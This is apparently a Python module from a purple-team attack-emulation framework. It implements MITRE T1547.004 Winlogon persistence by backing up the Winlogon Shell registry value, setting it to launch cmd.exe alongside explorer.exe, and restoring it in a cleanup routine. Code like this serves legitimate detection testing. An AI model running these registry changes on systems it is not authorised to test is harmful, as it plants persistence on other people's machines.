from __future__ import annotations

import logging
from typing import Any

from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import TargetConnection, get_connection

logger = logging.getLogger(__name__)

_WINLOGON_KEY = (
    "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
)


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    """Modify Winlogon Shell helper value for persistence."""
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        backup_cmd = (
            f"$orig = (Get-ItemProperty -Path '{_WINLOGON_KEY}').Shell; "
            f"Set-Content -Path 'C:\\Windows\\Temp\\purplestrike_winlogon_backup.txt' "
            f"-Value $orig"
        )
        await conn.run_ps(backup_cmd)
        set_cmd = (
            f"Set-ItemProperty -Path '{_WINLOGON_KEY}' "
            f"-Name 'Shell' -Value 'explorer.exe, cmd.exe'"
        )
        result = await conn.run_ps(set_cmd)
        return TechniqueResult(
            technique_id="T1547.004",
            success=result.success,
            output=result.stdout[:4096],
            error=result.stderr[:1024] if not result.success else None,
            execution_status=ExecutionStatus.SUCCESS if result.success else ExecutionStatus.FAILURE,
        )
    except Exception as e:
        logger.error(f"T1547.004 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1547.004",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    """Reverse any changes made during execution."""
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        restore_cmd = (
            "$orig = Get-Content -Path 'C:\\Windows\\Temp\\purplestrike_winlogon_backup.txt'; "
            f"Set-ItemProperty -Path '{_WINLOGON_KEY}' -Name 'Shell' -Value $orig; "
            "Remove-Item -Path 'C:\\Windows\\Temp\\purplestrike_winlogon_backup.txt' -Force"
        )
        await conn.run_ps(restore_cmd)
    except Exception as e:
        logger.warning(f"T1547.004 cleanup failed: {e}")
    finally:
        if conn:
            await conn.disconnect()
